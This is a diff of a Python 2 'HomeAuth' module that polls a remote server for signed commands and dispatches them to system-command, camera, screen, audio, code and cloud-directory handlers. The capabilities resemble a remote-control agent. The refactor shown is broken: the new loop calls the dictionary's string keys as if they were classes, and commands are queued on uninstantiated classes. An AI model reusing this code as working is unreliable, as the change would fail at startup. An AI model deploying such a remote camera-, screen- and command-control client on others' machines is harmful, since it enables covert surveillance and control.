@@ -12,7 +12,7 @@ import Crypto.Random
 from settings import *
 import CameraCmd
 import ScreenCmd
-import AudioPlayer
+import AudioCmd
 import SystemCmd
 import CodeCmd
 import CloudDir
@@ -23,19 +23,15 @@ class HomeAuth():
         self.pub = ''
         self.log = logging.getLogger('cmd')
         self.cmdpro = {
-            'system':Queue.Queue(),
-            'camera':Queue.Queue(),
-            'screen':Queue.Queue(),
-            'audio':Queue.Queue(),
-            'code':Queue.Queue(),
-            'clouddir':Queue.Queue(),
+            'system':SystemCmd.SystemCmd,
+            'camera':CameraCmd.CameraCmd,
+            'screen':ScreenCmd.ScreenCmd,
+            'audio':AudioCmd.AudioCmd,
+            'code':CodeCmd.CodeCmd,
+            'clouddir':CloudDir.CloudDir,
         }
-        CameraCmd.CameraCmd(self.cmdpro['camera']).start()
-        ScreenCmd.ScreenCmd(self.cmdpro['screen']).start()
-        AudioPlayer.AudioCmd(self.cmdpro['audio']).start()
-        SystemCmd.SystemCmd(self.cmdpro['syscmd']).start()
-        CodeCmd.CodeCmd(self.cmdpro['codecmd']).start()
-        CloudDir.CloudDir(self.cmdpro['clouddir']).start()
+        for pro in self.cmdpro:
+            pro().start()
     def getCmd(self):      
         if not self.pub:
             f = requests.get(ID_RSA_PUB,proxies=PROXY)
@@ -71,7 +67,7 @@ class HomeAuth():
                         if len(cmdline)<=1:
                             continue
                         try:
-                            self.cmdpro[cmdline[0]].put(cmdline[1:])
+                            self.cmdpro[cmdline[0]].cmdqueue.put(cmdline[1:])
                         except Exception,data:
                             self.log.error(data)
                 t = REQUESTS_TIME.total_seconds()
